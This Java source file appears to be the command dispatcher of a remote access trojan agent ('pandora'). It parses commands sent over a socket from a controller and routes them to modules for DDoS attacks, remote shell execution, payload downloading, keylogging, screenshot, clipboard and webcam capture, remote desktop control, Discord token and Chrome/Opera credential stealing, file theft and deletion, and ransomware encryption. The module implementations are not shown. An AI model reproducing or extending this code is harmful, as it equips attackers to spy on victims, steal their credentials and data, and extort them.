package org.pandora.agent.control;

import org.pandora.agent.Client;
import org.pandora.agent.control.impl.*;
import org.pandora.agent.socket.connection.Connection;

import java.net.Socket;

public class ControlManager {

    private final AttackController attackController;
    private final SocketController socketController;
    private final DownloaderController downloaderController;
    private final ShellController shellController;
    private ComputerStateController computerStateController;
    private ScreenshotController screenshotController;
    private ClipboardController clipboardController;
    private DiscordController discordController;
    private KeyboardController keyboardController;
    private ProcessController processController;
    private WebcamController webcamController;
    private DesktopController desktopController;
    private ChromeController chromeController;
    private OperaController operaController;
    private FileManagerController fileManagerController;
    private RansomController ransomController;

    public ControlManager(final Client client) {
        this.attackController = new AttackController();
        this.socketController = new SocketController();
        this.shellController = new ShellController(client);
        this.downloaderController = new DownloaderController(client);
        if (client.isWindows()) {
            this.computerStateController = new ComputerStateController();
            this.screenshotController = new ScreenshotController(client);
            this.clipboardController = new ClipboardController(client);
            this.discordController = new DiscordController(client);
            this.keyboardController = new KeyboardController(client);
            this.processController = new ProcessController(client);
            this.webcamController = new WebcamController(client);
            this.desktopController = new DesktopController(client);
            this.chromeController = new ChromeController(client);
            this.operaController = new OperaController(client);
            this.fileManagerController = new FileManagerController(client);
            this.ransomController = new RansomController(client);
        }
    }

    public void read(final Connection connection, final String text, final Socket socket) {
        if (socket == null || !socket.isConnected() || socket.isClosed())
            return;
        final Thread primaryThread = Thread.currentThread();
        new Thread(() -> {
            final String[] split = text.split(":");
            final String module = split[1];
            switch (module) {
                case "startAttack":
                    this.attackController.startAttack(split[2], split[3], split[4], split[5], split[6], split[7], split[8]);
                    break;
                case "stopAttack":
                    this.attackController.stopAttack(split[2], split[3]);
                    break;
                case "restartSocket":
                    this.socketController.restart(connection, socket);
                    break;
                case "shutdownComputer":
                    this.computerStateController.shutdown();
                    break;
                case "rebootComputer":
                    this.computerStateController.reboot();
                    break;
                case "downloader":
                    this.downloaderController.run(split[2], split[3], split[4]);
                    break;
                case "shell":
                    this.shellController.execute(split[2], split[3]);
                    break;
                case "screenshot":
                    this.screenshotController.execute(split[2]);
                    break;
                case "clipboard":
                    this.clipboardController.execute(split[2]);
                    break;
                case "discordGrabber":
                    this.discordController.execute(split[2]);
                    break;
                case "keylogger":
                    this.keyboardController.execute(split[2]);
                    break;
                case "processManager":
                    switch (split[2]) {
                        case "list":
                            this.processController.list(split[3]);
                            break;
                        case "close":
                            this.processController.close(split[3]);
                            break;
                    }
                    break;
                case "fileManager":
                    switch (split[2]) {
                        case "list":
                            this.fileManagerController.list(split[3], split[4]);
                            break;
                        case "download":
                            this.fileManagerController.download(split[3], split[4]);
                            break;
                        case "delete":
                            this.fileManagerController.delete(split[3], split[4]);
                            break;
                    }
                    break;
                case "desktop":
                    switch (split[2]) {
                        case "state":
                            this.desktopController.changeState(split[3], split[4]);
                            break;
                        case "sendMousePressed":
                            this.desktopController.receiveMousePressed(split[3], split[4]);
                            break;
                        case "sendMouseReleased":
                            this.desktopController.receiveMouseReleased(split[3], split[4]);
                            break;
                        case "sendMouseMove":
                            this.desktopController.receiveMouseMove(split[3], split[4], split[5]);
                            break;
                        case "sendKeyboardPressed":
                            this.desktopController.receiveKeyboardPressed(split[3], split[4]);
                            break;
                        case "sendKeyboardReleased":
                            this.desktopController.receiveKeyboardReleased(split[3], split[4]);
                            break;
                    }
                    break;
                case "webcam":
                    this.webcamController.execute(split[2]);
                    break;
                case "chromeStealer":
                    this.chromeController.execute(split[2]);
                    break;
                case "operaStealer":
                    this.operaController.execute(split[2]);
                    break;
                case "ransomware":
                    switch (split[2]) {
                        case "encrypt":
                            this.ransomController.encrypt(split[3], split[4]);
                            break;
                        case "decrypt":
                            this.ransomController.decrypt(split[3]);
                            break;
                    }
                    break;
            }
            this.close(primaryThread, Thread.currentThread());
        }).start();
    }

    private void close(final Thread primaryThread, final Thread secondThread) {
        if (primaryThread != secondThread && (!secondThread.isInterrupted() && secondThread.isAlive()))
            secondThread.interrupt();
    }
}
